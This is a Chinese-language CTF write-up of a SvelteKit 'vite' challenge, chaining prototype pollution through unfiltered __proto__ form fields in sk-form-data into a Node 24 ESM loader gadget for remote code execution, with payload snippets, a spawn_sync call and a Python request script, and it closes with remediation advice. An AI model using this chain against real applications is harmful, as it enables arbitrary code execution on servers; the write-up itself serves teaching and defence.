# vite

## 题目简述

题目是最小 SvelteKit 应用，使用：

```json
"vite": "^6.2.6",
"@sveltejs/kit": "^2.16.0",
"sk-form-data": "^2.0.2"
```

服务端 hook 把 `sk-form-data` 直接作为全局请求处理器。依赖会把点号路径的表单字段展开为嵌套对象，却没有过滤 `__proto__`。在 Node.js 24 中，污染 `Object.prototype.source` 又能命中 ESM loader 的动态导入 gadget，把字符串当作模块源码编译执行。

## 解题过程

### 1. 通过表单字段污染原型

发送 `application/x-www-form-urlencoded` POST：

```text
__proto__.source=<JavaScript source>
```

`sk-form-data` 克隆请求并调用 `parseFormData`。解析器逐段处理 `__proto__.source`：

```text
currentObject["__proto__"] -> Object.prototype
Object.prototype["source"] = payload
```

因此所有继承普通对象原型的上下文都能读到攻击者的 `source`。

SvelteKit 会校验表单请求来源，官方脚本同时发送：

```text
Origin: <目标站点 origin>
```

### 2. 用不存在路由触发动态 import

请求路径选择 `/a`。它没有对应路由，SvelteKit 构造错误页时会动态加载根布局节点。

Node 24 的 ESM `defaultLoad(url, context)` 从普通 `context` 解构：

```javascript
let { importAttributes, format, source } = context;
```

由于 `context` 继承 `Object.prototype`，此时 `source` 取得污染值。随后代码仅在：

```javascript
if (source == null) {
    source = await getSource(...);
}
```

时才从磁盘读取真实模块。攻击者提供的是非空字符串，文件读取被跳过；该字符串流入 module translator，并由 V8 当作 ESM 源码编译执行。

### 3. 执行仅可执行的 `/flag`

容器把 flag 编译为静态 ELF，并设置权限为 execute-only，不能直接 `readFile("/flag")`。恶意模块使用 Node 内部绑定启动它：

```javascript
const result = process.binding("spawn_sync").spawn({
  file: "/flag",
  args: ["/flag"],
  stdio: [
    { type: "pipe", readable: true,  writable: false },
    { type: "pipe", readable: false, writable: true  },
    { type: "pipe", readable: false, writable: true  }
  ]
});
```

`/flag` 自己把 flag 写到 stdout。载荷将输出 Base64 后继续污染：

```javascript
Object.prototype.flag = btoa(result.output.toString());
```

### 4. 从响应头取回

Vite 构造响应头时对普通 header 对象做会枚举继承属性的遍历，因此污染的 `flag` 被加入 HTTP 响应头。完整请求可概括为：

```python
response = requests.post(
    BASE_URL + "/a",
    data={"__proto__.source": MODULE_SOURCE},
    headers={"Origin": BASE_URL},
)
flag = base64.b64decode(response.headers["flag"])
```

仓库 `flag.s` 中的结果为：

```text
SEKAI{p0llu71ng_pr0707yp35_1n_v173_w45_7h3_k3y_70_rc3_4nd_y0u_m4n493d_70_p1ck_7h3_n33dl3_fr0m_7h3_h4y574ck}
```

整个过程不需要出网，数据直接通过当前响应头返回。

## 方法总结

这是“污染源 + 运行时通用 gadget + 回显 gadget”的完整链：

```text
parse-nested-form-data
→ Object.prototype.source
→ Node 24 ESM loader
→ 执行恶意模块
→ spawn /flag
→ Object.prototype.flag
→ Vite 响应头
```

修复时应拒绝路径中的 `__proto__`、`prototype`、`constructor`，并让内部对象使用 null prototype。运行时框架读取 `context.source` 这类可选字段时也应要求 own property，而不是接受原型链值；响应头遍历则应使用 `Object.keys` 或 `Object.hasOwn`。
